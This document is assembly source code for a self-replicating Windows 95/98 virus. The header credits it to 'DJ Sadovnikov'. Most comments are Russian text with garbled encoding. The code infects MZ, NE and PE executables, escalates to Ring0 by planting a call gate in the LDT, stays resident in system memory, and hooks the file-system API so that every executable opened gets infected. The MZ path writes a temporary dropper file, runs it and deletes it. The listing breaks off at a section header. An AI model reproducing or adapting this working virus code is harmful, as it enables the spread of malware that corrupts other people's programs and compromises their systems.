   DEBUG = 0   ; 1 - ¢ª«îç¨âì ®â« ¤®çë© à¥¦¨¬
           ; 0 - ¢ëª«îç¨âì ®â« ¤®çë© à¥¦¨¬

   ; COMMENT %
   ;
   ;   MZ-EXE.NE-EXE.PE-EXE.R0-TSR. Infects MZ-EXE files by appending
   ;   to the end of file, NE-EXE by creating of new segment at the
   ;   end of file and PE-EXE by appending to the last section.
   ;   Operates under Windows95/98 only. At starting from MZ-EXE:
   ;   creating of temporary dropper, V86->PROT16 (by using of DPMI calls),
   ;   PROT16->PROT32R0 (by creating of callgate at the LDT).
   ;   At starting from NE-EXE: PROT16->PROT32R0. At starting from
   ;   PE-EXE: installing of SEH, PROT32R3->PROT32R0. When entered Ring0,
   ;   virus installs itself into system memory and hooks IFS.
   ;
   ;
   ;    *¥à¥¤ ¢ ¬¨ ¬®ï ¢â®à ï ¯®¯ëâª  á®§¤ ¨ï ¢¨àãá  ¤«ï Windows95. ’ ª ¯®«ãç¨«®áì,
   ; çâ® íâ®â ¢¨àãá ¢ëå®¤¨â ¢ á¢¥â à ìè¥ ¯à¥¤ë¤ãé¥£® (â ¬ ã¦® ª®¥-çâ® ¤®¤¥« âì),
   ; ã   íâ®â ¯à®¤ãªâ â®¦¥ ¡ã¤¥â ¯®â®¬ ¤®à ¡ âë¢ âìáï. ‚¨àãá ï¢«ï¥âáï ¢ ¥ª®â®à®¬
   ; à®¤¥ ¬ã«ìâ¨¯« âä®à¬¥ë¬. Ž § à ¦ ¥â MZ, NE ¨ PE-EXE, ® à ¡®â®á¯®á®¡¥ â®«ìª®
   ; ¯®¤ Windows95/98. ‡ à ¦¥¨¥ ¯à®¨áå®¤¨â ¯à¨ ®âªàëâ¨¨ ä ©« . Ž¡à ¡ âë¢ îâáï ä ©«ë
   ; á  âà¨¡ãâ®¬ "ReadOnly". €âà¨¡ãâë ä ©«  ¥ ¨§¬¥ïîâáï. ‡ à ¦¥¨¥ ä ©«®¢:
   ;
   ;  * MZ-EXE. ‘â ¤ àâë¬ ®¡à §®¬ ¤®¯¨áë¢ ¥âáï ¢ ª®¥æ ä ©«  ¨ ª®àà¥ªâ¨àã¥â MZ-EXE
   ;    § £®«®¢®ª.
   ;  * NE-EXE. „®¡ ¢«ï¥â ¢ â ¡«¨æã á¥£¬¥â®¢ ®¯¨á ¨¥ ¥é¥ ®¤®£® á¥£¬¥â . „ «¥¥
   ;    ª®àà¥ªâ¨àã¥â NE-EXE § £®«®¢®ª ¨ ¤®¯¨áë¢ ¥âáï ¢ ª®¥æ ä ©« .
   ;  * PE-EXE. „®¯¨áë¢ ¥âáï ª ¯®á«¥¤¥© á¥ªæ¨¨ ¨ ª®àà¥ªâ¨àã¥â PE-EXE § £®«®¢®ª ¨
   ;    ¤¥áªà¨¯â®à ¯®á«¥¤¥© á¥ªæ¨¨.
   ;
   ; ‚¨àãá à¥§¨¤¥âë©. “áâ ®¢ª  ¢ ¯ ¬ïâì ®áãé¥áâ¢«ï¥âáï á«¥¤ãîé¨¬ ®¡à §®¬:
   ;
   ;  * PE-EXE. Ž¡à ¡®âç¨ª ¨áª«îç¥¨© (SEH) ãáâ  ¢«¨¢ ¥âáï   ¢¨àãá, çâ®¡ë ¥
   ;    ¤®¯ãáâ¨âì £«îª®¢ ¯®¤ WindowsNT. ‚ 1-®¬ ¤¥áªà¨¯â®à¥ LDT á®§¤ ¥âáï è«î§
   ;    ¢ë§®¢  (CallGate), ª®â®àë© ãª §ë¢ ¥â   ¯à®æ¥¤ãàã Ring0. *à¨ ¢ë§®¢¥ íâ®£®
   ;    CallGate ¯à®æ¥¤ãà  Ring0 ¯®«ãç ¥â ã¯à ¢«¥¨¥ á ¯à¨¢¥«¥£¨ï¬¨ ã«¥¢®£®
   ;    ª®«ìæ . *â  ¯à®æ¥¤ãà  ¢ë¤¥«ï¥â áâà ¨æã ¯ ¬ïâ¨ ¢ ®¡« áâ¨ ¢ëè¥ 2Gb, § é¨é ¥â
   ;    ¥¥ ®â çâ¥¨ï ¨§ 3-£® ª®«ìæ  ¨ ª®¯¨àã¥â âã¤  ¢¨àãá. ‡ â¥¬ ¯¥à¥å¢ âë¢ë ¥âáï
   ;    ®¡à ¡®âç¨ª IFS ¨ ãáâ  ¢«¨¢ ¥âáï ®¡à ¡®âç¨ª ¯®àâ  28h (çâ®¡ë ®¯à¥¤¥«ïâì
   ;    ¯à¨áãâáâ¢¨¥ ª®¯¨¨ ¢¨àãá  ¢ ¯ ¬ïâ¨). „ «¥¥ ¯à®¨áå®¤¨â ¢®§¢à â ¢ 3-¥ ª®«ìæ®,
   ;    ¨ ã¯à ¢«¥¨¥ ®â¤ ¥âáï ä ©«ã-®á¨â¥«î.
   ;  * NE-EXE. ’® ¦¥ á ¬®¥, çâ® ¨ ¢ PE-EXE, â®«ìª® è«î§ ¢ë§®¢  á®§¤ ¥âáï á ¯®¬®éìî
   ;    DPMI-¢ë§®¢®¢.
   ;  * MZ-EXE. *  ¤¨áª á¡à áë¢ ¥âáï ¨ § ¯ãáª ¥âáï ¤à®¯¯¥à á ¢¨àãá®¬, ¢  ç «¥
   ;    ª®â®à®£® à á¯®«®¦¥  ¯à®æ¥¤ãà  ¯¥à¥å®¤  ¢ ã«¥¢®¥ ª®«ìæ®. *â  ¯à®æ¥¤ãà 
   ;    ¢ë¯®«ï¥â ¯¥à¥å®¤ ¢ § é¨é¥ë© à¥¦¨¬. „ «¥¥ ¢á¥ ¯à®¨áå®¤¨â â ª ¦¥, ª ª ¢
   ;    NE-EXE. *®á«¥ íâ®£® ¤à®¯¯¥à ã¤ «ï¥âáï á ¤¨áª ,   ã¯à ¢«¥¨¥ ¯¥à¥¤ ¥âáï
   ;    ¯à®£à ¬¬¥-®á¨â¥«î.
   ;
   ;                                   DJ Sadovnikov (http://i.am/djsad), 12.12.2000
   ;
   ;  ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
   ;
   ;                  Š®¬¯¨«¨à®¢ âì á ¯®¬®éìî TASM 4.1+
   ;
   ;                     tasm /m winmulti.asm
   ;                     tlink /3 /x winmulti.obj
   ;                     del winmulti.obj
   ;
   ;
   ;                  ” ©«ë ¨§  àå¨¢ :
   ;
   ;                     winmulti.asm 23000 (¨áå®¤¨ª ¢¨àãá )
   ;                     winmulti.exe  2557 (¡¨ à¨ª ¢¨àãá )
   ;                     winmulti.doc 10870 (â¥å¨ç¥áª ï ¨ä®à¬ æ¨ï)
   ; %
   ;
   ;
   ;
   ;
   ;
   ;
   ;
   ;
   ;
   ;


   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

           .386p
   Code16      segment byte use16
           assume  cs:Code16, ds:Code16


   Start:      mov ah, 9
           mov dx, offset Msg+100h
           int 21h
           mov ax, 4C00h
           int 21h

   Msg     db  'Virus has started...$'

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ





















   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
   ;                „*Ž**…* „‹Ÿ *…*…•Ž„€ ˆ‡ V86 ‚ RING0
   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   ;[“ª®à ç¨¢ ¥¬ â¥ªãé¨© ¡«®ª ¯ ¬ïâ¨]

   Start16:    mov ah, 4Ah
           mov bx, 1000h
           int 21h
           jc  Terminate


   ;[*®«ãç ¥¬  ¤à¥á DPMI]

           mov ax, 1687h
           int 2Fh
           or  ax, ax
           jnz Terminate
           mov ds:[OfsDPMI-Start16+100h], di
           mov ds:[SegDPMI-Start16+100h], es


   ;[‚ë¤¥«ï¥¬ ¯ ¬ïâì ¤«ï ¤ ëå DPMI]

           mov ah, 48h
           mov bx, si
           int 21h
           jc  Terminate
           mov ds, ax
           mov es, ax


   ;[*¥à¥å®¤¨¬ ¢ § é¨é¥ë© à¥¦¨¬]

           xor ax, ax
           db  9Ah
   OfsDPMI     dw  0
   SegDPMI     dw  0
           jc  Terminate


   ;[“áâ  ¢«¨¢ ¥¬ ¢¨àãá ¢ ¯ ¬ïâì]

           call    EnterR0


   ;[Žâ¤ ¥¬ ã¯à ¢«¥¨¥ DOS]

   Terminate:  mov ax, 4C00h
           int 21h

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ





















   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
   ;            ’*€*‡ˆ’*€Ÿ —€‘’œ „‹Ÿ *…*…•Ž„€ ˆ‡ PROT16 ‚ PROT32
   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   EnterR0:    call    Entry1
   Entry1:     pop si
           sub si, Entry1-Start16


   ;[‘®§¤ ¥¬ ¤®¯®«¨â¥«ìë© ¤¥áªà¨¯â®à]

           mov ax, 0Ah
           mov bx, cs
           int 31h
           mov ds, ax


   ;[‘®åà ï¥¬ ¢ áâ¥ª¥ à §¬¥à ¨  ¤à¥á GDT]

           sub sp, 6
           mov bp, sp
           sgdt    [bp]


   ;[“áâ  ¢«¨¢ ¥¬ ®¢ë© à §¬¥à á¥£¬¥â  DS]

           mov ax, 8
           mov bx, ds
           xor cx, cx
           pop dx
           int 31h


   ;[“áâ  ¢«¨¢ ¥¬ á¥£¬¥â DS   GDT]

           mov ax, 7
           mov bx, ds
           pop dx
           pop cx
           int 31h


   ;[*®«ãç ¥¬  ¤à¥á LDT]

           sldt    bx
           and bl, 11111000b
           jz  Error
           mov cl, ds:[bx+4]
           mov ch, ds:[bx+7]
           mov dx, ds:[bx+2]


   ;[“áâ  ¢«¨¢ ¥¬ á¥£¬¥â DS   LDT]

           mov ax, 7
           mov bx, ds
           int 31h


   ;[‘®åà ï¥¬ ¯¥à¢ë© ¤¥áªà¨¯â®à ¢ LDT]

           push    dword ptr ds:[0]
           push    dword ptr ds:[4]


   ;[‚ëç¨á«ï¥¬ «¨¥©ë©  ¤à¥á ¬¥âª¨ Ring0]

           mov ax, 6
           mov bx, cs
           int 31h
           lea ax, [(Ring0-Start32)+(EndCode16-Start16)+si]
           add dx, ax
           adc cx, 0


   ;[‘®§¤ ¥¬ ¢ ¯¥à¢®¬ ¤¥áªà¨¯â®à¥ LDT è«î§ ¢ë§®¢ ]

           mov ds:[0], dx
           mov ds:[2], (11101100b shl 24) + 28h
           mov ds:[6], cx


   ;[*¥à¥å®¤¨¬ ¢ ã«¥¢®¥ ª®«ìæ®]

           db  9Ah
           dw  0
           dw  00000111b


   ;[‚®ááâ  ¢«¨¢ ¥¬ ¯¥à¢ë© ¤¥áªà¨¯â®à LDT]

           pop dword ptr ds:[4]
           pop dword ptr ds:[0]


   ;[“¨çâ®¦ ¥¬ á®§¤ ë© à ¥¥ ¤®¯®«¨â¥«ìë© ¤¥áªà¨¯â®à]

   Error:      mov ax, 1
           mov bx, ds
           int 31h
           ret

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ





















   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
   ;                     ’*€*‡ˆ’*€Ÿ —€‘’œ „‹Ÿ MZ-EXE
   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   StartMZ:    pusha
           push    ds es

           call    Entry2
   Entry2:     pop si
           sub si, Entry2-Start16


   ;[*à®¢¥àï¥¬  «¨ç¨¥ ¢¨àãá  ¢ ¯ ¬ïâ¨]

           in  ax, 28h
           cmp ax, 0ABCDh
           je  QuitMZ


   ;[*®«ãç ¥¬ ¢¥àá¨î Windows]

           mov ax, 1600h
           int 2Fh
           cmp al, 4
           jne QuitMZ


   ;[“ª®à ç¨¢ ¥¬ â¥ªãé¨© ¡«®ª ¯ ¬ïâ¨]

           mov ax, ds
           dec ax
           mov ds, ax
           mov bx, ds:[3]
           sub bx, 2000h
           mov ah, 4Ah
           int 21h
           jc  QuitMZ


   ;[‘®§¤ ¥¬ ä ©« ¤«ï ¤à®¯¯¥à ]

           mov ah, 3Ch
           xor cx, cx
           lea dx, [FName-Start16+si]
           push    cs
           pop ds
           int 21h
           jc  QuitMZ
           xchg    bx, ax


   ;[‡ ¯¨áë¢ ¥¬ ¢ ¥£® ª®¤ ¢¨àãá ]

           mov ah, 40h
           mov cx, CodeSize
           mov dx, si
           int 21h
           jc  QuitMZ


   ;[‡ ªàë¢ ¥¬ ä ©«]

           mov ah, 3Eh
           int 21h
           jc  QuitMZ


   ;[*®¤£®â ¢«¨¢ ¥¬ ¡«®ª ¯ à ¬¥âà®¢ ¤«ï § ¯ãáª  ¤à®¯¯¥à ]

           lea bx, [PBlock-Start16+si]
           mov ds:[bx+04h], cs
           mov ds:[bx+08h], cs
           mov ds:[bx+0Ch], cs


   ;[‡ ¯ãáª ¥¬ ¤à®¯¯¥à]

           mov ax, 4B00h
           lea dx, [FName-Start16+si]
           push    cs
           pop es
           int 21h


   ;[“¤ «ï¥¬ ¤à®¯¯¥à]

           mov ah, 41h
           lea dx, [FName-Start16+si]
           int 21h


   ;[Žâ¤ ¥¬ ã¯à ¢«¥¨¥ ä ©«ã-®á¨â¥«î]

   QuitMZ:     pop es ds

           mov ax, es
           add ax, 10h
           add cs:[OldCSIP+2-Start16+si], ax
           add cs:[OldSS+1-Start16+si], ax

           popa
           jmp $+2

           cli
   OldSS:      mov sp, 0
           mov ss, sp
   OldSP:      mov sp, 0
           sti

           db  0EAh
   OldCSIP     dd  0


   PBlock      dw  0
           dw  80h, 0
           dw  5Ch, 0
           dw  6Ch, 0

   FName       db  'DJ.SAD',0

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ





















   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
   ;                     ’*€*‡ˆ’*€Ÿ —€‘’œ „‹Ÿ NE-EXE
   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   StartNE:    pusha
           push    ds es


   ;[*à®¢¥àï¥¬  «¨ç¨¥ ¢¨àãá  ¢ ¯ ¬ïâ¨]

           in  ax, 28h
           cmp ax, 0ABCDh
           je  QuitNE


   ;[*®«ãç ¥¬ ¢¥àá¨î Windows]

           mov ax, 1600h
           int 2Fh
           cmp al, 4
           jne QuitNE


   ;[*à®¢¥àï¥¬  «¨ç¨¥ DPMI]

           mov ax, 1686h
           int 2Fh
           or  ax, ax
           jnz QuitNE


   ;[“áâ  ¢«¨¢ ¥¬ ¢¨àãá ¢ ¯ ¬ïâì]

           call    EnterR0


   ;[Žâ¤ ¥¬ ã¯à ¢«¥¨¥ ä ©«ã-®á¨â¥«î]

   QuitNE:     pop es ds
           popa

           db  0EAh
   ReloCSIP    dd  0

   EndCode16   =   $

   Code16      ends

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ





















   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
   ;                    ’*€*‡ˆ’*€Ÿ —€‘’œ „‹Ÿ PE-EXE
   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   Code32      segment byte use32
           assume  cs:Code32, ds:Code32

   Start32     =   $

   StartPE:    pushfd
           pushad


   ;[“áâ  ¢«¨¢ ¥¬ ®¡à ¡®âç¨ª ¨áª«îç¥¨©]

           call    Seh
           mov esp, [esp+8]
           jmp QuitPE
   Seh:        push    dword ptr fs:[0]
           mov fs:[0], esp


   ;[*à®¢¥àï¥¬  «¨ç¨¥ ¢¨àãá  ¢ ¯ ¬ïâ¨]

           in  ax, 28h
           cmp ax, 0ABCDh
           je  QuitPE


   ;[‚ëç¨á«ï¥¬ EIP]

           call    Entry3
   Entry3:     pop ebp
           sub ebp, Entry3-Start32


   ;[‚ëç¨á«ï¥¬  ¤à¥á LDT]

           push    ebx
           sgdt    [esp-2]
           pop ebx
           xor eax, eax
           sldt    ax
           and al, 11111000b
           jz  QuitPE

           add ebx, eax
           mov eax, [ebx+1]
           mov al, [ebx+7]
           ror eax, 8
           xchg    edi, eax


   ;[‘®åà ï¥¬ ¯¥à¢ë© ¤¥áªà¨¯â®à LDT]

           push    dword ptr [edi]
           push    dword ptr [edi+4]


   ;[‘®§¤ ¥¬ ¢ ¯¥à¢®¬ ¤¥áªà¨¯â®à¥ LDT è«î§ ¢ë§®¢ ]

           lea eax, [Ring0-Start32+ebp]
           mov [edi], eax
           mov [edi+4], eax
           mov [edi+2], (11101100b shl 24) + 28h


   ;[*¥à¥å®¤¨¬ ¢ ã«¥¢®¥ ª®«ìæ®]

           db  9Ah
           dd  0
           dw  00000111b


   ;[‚®ááâ  ¢«¨¢ ¥¬ ¯¥à¢ë© ¤¥áªà¨¯â®à LDT]

           pop dword ptr [edi+4]
           pop dword ptr [edi]


   ;[Žâ¤ ¥¬ ã¯à ¢«¥¨¥ ä ©«ã-®á¨â¥«î]

   QuitPE:     pop dword ptr fs:[0]
           pop eax         ; Fixup stack

           popad
           popfd

           db  0E9h
   RetAddress  dd  0

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ





















   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
   ;                    ’*€*‡ˆ’*€Ÿ —€‘’œ „‹Ÿ RING0
   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   Ring0:      pushad
           push    ds es
           push    ss ss
           pop ds es


   ;[‚ëç¨á«ï¥¬ EIP]

           call    Entry4
   Entry4:     pop ebp
           sub ebp, Entry4-Start32


   ;[‚ë¤¥«ï¥¬ ¯ ¬ïâì]

           push    9
           xor eax, eax
           push    eax
           push    eax
           push    eax
           push    eax
           push    eax
           inc eax
           push    eax
           push    large MemSize
           push    00010053h       ; _PageAllocate
           call    VxDcall
           add esp, 4*8
           or  eax, eax
           jz  Quit


   ;[‘¡à áë¢ ¥¬ ä« ¦®ª § ïâ®áâ¨]

           mov byte ptr [Busy-Start32+ebp], 0


   ;[Š®¯¨àã¥¬ ª®¤ ¢ ¯ ¬ïâì]

           mov edi, eax
           lea esi, [Start16-EndCode16+ebp]
           mov ecx, CodeSize
           cld
           rep movsb
           mov edi, eax


   ;[‡ é¨é ¥¬ áâà ¨æã ®â çâ¥¨ï ¨§ 3-£® ª®«ìæ ]

           push    20000000h
           push    not 00060000h
           push    large MemSize
           shr eax, 12
           push    eax
           push    00010133h       ; _PageModifyPermisions
           call    VxDcall
           add esp, 4*4


   ;[“áâ  ¢«¨¢ ¥¬ ®¡à ¡®âç¨ª ¯®àâ  28h]

           lea esi, [(Port28h-Start32)+(EndCode16-Start16)+edi]
           mov edx, 28h
           push    00010096h       ; Install_IO_Handler
           call    VxDcall
           jc  Quit


   ;[“áâ  ¢«¨¢ ¥¬ á¢®© ®¡à ¡®âç¨ª IFS]

           lea eax, [(ApiHook-Start32)+(EndCode16-Start16)+edi]
           push    eax
           push    00400067h       ; InstallFileSystemApiHook
           call    VxDcall
           mov [(PrevHook-Start32)+(EndCode16-Start16)+edi], eax
           pop eax


   Quit:       pop es ds
           popad
           retf

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ





















   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
   ;                             Ž**€*Ž’—ˆŠˆ
   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   Port28h:    mov ax, 0ABCDh
           ret


   ;[*à®¢¥àï¥¬, ª ªãî äãªæ¨î ¯ëâ îâáï ¢ë¯®«¨âì]

   ApiHook:    cmp [esp+08h], dword ptr 0024h  ; FileOpen
           jne Exit1


   ;[‚ëç¨á«ï¥¬ EIP]

           pushad
           call    Entry5
   Entry5:     pop ebp
           sub ebp, Entry5-Start32


   ;[“áâ  ¢«¨¢ ¥¬ ä« ¦®ª § ïâ®áâ¨]

           cmp byte ptr [Busy-Start32+ebp], 0FFh
           je  Exit2
           not byte ptr [Busy-Start32+ebp]


   ;[Ž¯à¥¤¥«ï¥¬ ¡ãª¢ã ¤¨áª ]

           lea esi, [FileName-Start32+ebp]
           mov al, [esp+0Ch+20h]
           cmp al, 0
           jle Exit3
           add al, 'A'-1
           mov ah, ':'
           mov [esi], ax


   ;[*à¥®¡à §®¢ë¢ ¥¬ ª®¤¨à®¢ªã]

           mov eax, [esp+18h+20h]
           mov eax, [eax+0Ch]
           add eax, 4
           push    dword ptr [esp+14h+20h]
           push    254
           push    eax
           lea eax, [esi+2]
           push    eax
           push    00400041h       ; UniToBCSPath
           call    VxDcall
           add esp, 4*4
           or  edx, edx
           jnz Exit3
           mov [esi+eax+2], byte ptr 0


   ;[*à®¢¥àï¥¬ à áè¨à¥¨¥ ä ©« ]

           cmp [esi+eax-2], 'EXE.'
   IF DEBUG
           org $-4
           dd  'XXX.'
   ENDIF
           jne Exit3


   ;[…á«¨ íâ® KRNL386.EXE, â® ¢ëå®¤¨¬]

           cmp [esi+eax-9], 'LNRK'
           je  Exit3


   ;[*®«ãç ¥¬  âà¨¡ãâë ä ©« ]

           mov ax, 4300h       ; R0_GetFileAttributes
           call    FileIO
           jc  Exit3
           push    ecx
           push    esi


   ;[Ž¡ã«ï¥¬  âà¨¡ãâë ä ©« ]

           mov ax, 4301h       ; R0_SetFileAttributes
           xor ecx, ecx
           call    FileIO
           jc  RestAttr


   ;[Žâªàë¢ ¥¬ ä ©«]

           mov eax, 0D500h     ; R0_OpenCreateFile
           mov bx, 2022h
           mov dx, 1
           call    FileIO
           jc  RestAttr
           xchg    ebx, eax


   ;[‘ç¨âë¢ ¥¬ MZ § £®«®¢®ª]

           mov ecx, DosHeaderSize
           xor edx, edx
           lea esi, [DosHeader-Start32+ebp]
           call    Read
           jc  Close


   ;[*à®¢¥àï¥¬ â¨¯ ä ©«  ¨ ¥£® § à ¦¥®áâì]

           cmp [DosHeader-Start32+00h+ebp], word ptr 'ZM'
           jne Close
           cmp [DosHeader-Start32+12h+ebp], word ptr 6666h
           je  Close


   ;[‘ç¨âë¢ ¥¬ ç¥âëà¥ ¡ ©â  ¯® á¬¥é¥¨î 3Ch ®â  ç «  ä ©« ]

           mov ecx, 4
           mov edx, 3Ch
           lea esi, [WinHeaderOfs-Start32+ebp]
           call    Read
           jc  Close


   ;[‘ç¨âë¢ ¥¬ PE § £®«®¢®ª]

           mov ecx, WinHeaderSize
           mov edx, [WinHeaderOfs-Start32+ebp]
           lea esi, [WinHeader-Start32+ebp]
           call    Read
           jc  Close
           cmp eax, ecx
           jne InfectMZ


   ;[*à®¢¥àï¥¬ â¨¯ ä ©« ]

           mov ax, [WinHeader-Start32+ebp]
           cmp ax, 'EP'
           je  InfectPE
           cmp ax, 'EN'
           je  InfectNE
           cmp ax, 'EL'
           je  Close
           cmp ax, 'XL'
           jne InfectMZ


   ;[‡ ªàë¢ ¥¬ ä ©«]

   Close:      mov eax, 0D700h         ; R0_CloseFile
           call    FileIO


   ;[‚®ááâ  ¢«¨¢ ¥¬  âà¨¡ãâë ä ©« ]

   RestAttr:   mov ax, 4301h
           pop esi
           pop ecx
           call    FileIO


   ;[‘¡à áë¢ ¥¬ ä« ¦®ª § ïâ®áâ¨ ¨ ¯¥à¥¤ ¥¬ ã¯à ¢«¥¨¥ ¤ «ìè¥]

   Exit3:      not byte ptr [Busy-Start32+ebp]
   Exit2:      popad
   Exit1:      dw  25FFh
   PrevHook    dd  0

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ





















   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
   ;                           ‡€*€†…*ˆ… ”€‰‹Ž‚
